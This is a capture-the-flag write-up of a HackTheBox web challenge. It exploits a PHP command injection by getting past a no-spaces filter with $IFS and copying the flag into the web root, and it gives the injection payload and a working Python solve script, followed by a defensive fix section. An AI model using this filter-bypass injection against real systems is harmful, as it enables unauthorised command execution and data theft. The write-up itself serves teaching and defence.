---
title: "Void Whispers"
date: 2026-11-10 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, command-injection, ifs, php, cwe-78]
description: "A Very Easy Web challenge built around OS command injection. The only defense is a 'no spaces allowed' filter — which falls instantly to the shell's $IFS variable, and a blind sink is read back by copying the flag into the web root."
---

## Overview

`Void Whispers` is a Very Easy HackTheBox **Web** challenge about
[OS command injection](https://cwe.mitre.org/data/definitions/78.html). A mail
settings form passes one of your fields straight into a shell command, and the
only protection is a "no spaces allowed" filter. That filter is defeated with
the shell's `$IFS` variable, and because the injection is blind we read the flag
back by copying it into the web root and requesting it over HTTP.

## The technique

The `/update` endpoint validates a `sendMailPath` field and then runs it through
`which` to check the binary exists:

```php
if (preg_match('/\s/', $sendMailPath)) {            // reject ANY whitespace
  return ... 'Sendmail path should not contain spaces!';
}
$whichOutput = shell_exec("which $sendMailPath");   // user input -> shell
if (empty($whichOutput)) {                          // only emptiness checked
  return ... 'Binary does not exist!';
}
```

Three observations make this exploitable:

1. `$sendMailPath` is concatenated into a shell string unescaped — textbook
   [command injection](https://cwe.mitre.org/data/definitions/78.html).
2. The only filter is `preg_match('/\s/', ...)`, which rejects whitespace. It
   does **not** reject `;`, `|`, `&`, `$()`, or backticks — every metacharacter
   we actually need survives.
3. The command's output is never returned to us; the app only tests whether it
   was empty. So this is a **blind** injection.

A real command like `cp /flag.txt /www/loot.txt` needs spaces, which are banned.
The shell's `$IFS` (Internal Field Separator) variable expands to whitespace at
runtime, but the literal text `$IFS` contains no whitespace characters — so it
passes the `/\s/` regex untouched:

```
cp$IFS/flag.txt$IFS/www/loot.txt    ->   cp /flag.txt /www/loot.txt
```

Break out of the `which` call with `;`, and the injected value becomes
`;cp$IFS/flag.txt$IFS/www/loot.txt;`.

Because the injection is blind, we need a side channel to read the output. The
web root `/www` is writable by the web user and nginx serves static files from
it, so we copy the flag into the web root and then simply request it over HTTP.
(A reverse shell would be less reliable — these challenge containers commonly
have outbound high ports firewalled.)

## Solution

Create `solve.py`:

```python
import sys, requests, time

base = "http://" + sys.argv[1]
out  = f"s{str(int(time.time()))[-6:]}.txt"

# $IFS supplies the forbidden spaces; ; breaks out of `which`
requests.post(base + "/update", data={
    "from": "x",
    "mailProgram": "sendmail",
    "sendMailPath": f";cp$IFS/flag.txt$IFS/www/{out};",
    "email": "x@x.htb",
})

# app replies "Binary does not exist!" (which output empty) — but the cp ran
print(requests.get(f"{base}/{out}").text)
```

Run it against the live instance:

```bash
python3 solve.py <target-host>:<port>
# -> HTB{...}
```

The flag prints live.

## Why it worked

A blacklist is not a sanitiser. Filtering one class of character (whitespace)
leaves every shell metacharacter intact, and `$IFS` trivially restores the
spaces a multi-argument command needs. The blind nature of the sink only changed
*how* we read the output — not whether we controlled execution.

## Fix / defense

Never build a shell string from user input:

```php
// escape the argument
shell_exec('which ' . escapeshellarg($sendMailPath));
// better — allowlist exact known-good paths
if (!in_array($sendMailPath, ['/usr/sbin/sendmail'], true)) die('bad path');
```

Pass argument arrays or use `escapeshellarg()`, or restrict the value to a small
allowlist of legitimate binary paths. Trying to "filter dangerous characters" on
the way into a shell is a losing game.
